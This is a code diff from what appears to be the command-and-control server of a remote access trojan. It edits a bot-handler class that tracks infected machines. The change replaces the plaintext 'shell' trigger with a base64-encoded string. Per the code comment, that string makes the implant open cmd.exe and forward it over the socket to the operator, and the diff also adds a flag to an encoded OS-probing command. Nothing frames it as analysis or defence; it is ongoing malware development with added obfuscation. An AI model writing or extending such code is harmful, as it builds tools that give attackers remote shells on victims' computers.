@@ -90,7 +90,7 @@ class Handler(threading.Thread):
         self.status[1] = index1
 
     def setOS(self):
-        self.os = self.execute("UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt")
+        self.os = self.execute("UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt", True)
         
     def getOS(self):
         return self.os
@@ -114,11 +114,10 @@ class Handler(threading.Thread):
 
         self.beacon_wait = True
 
-
         # Initiate shell
 
         try:
-            self.client.send(("shell").encode('utf-8'))             # Signals RAT to initiate cmd.exe process and forward fds to socket 
+            self.client.send(("aSB3YW50IHNoZWxsIG5vdw").encode('utf-8'))             # Signals RAT to initiate cmd.exe process and forward fds to socket 
         except Exception as ex:
             print(f"[* BotHandler-Msg:ShellExec] Unable to initiate shell with bot {self.bot_id} at {str(self.ip)}")
             print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
@@ -259,7 +258,7 @@ class Handler(threading.Thread):
                 else:
                     cmd_response += recv
             
-            return cmd_response
+            return str(cmd_response)
     # TODO %%
     def download(self, remotepath, localfile):
         print("TBC")
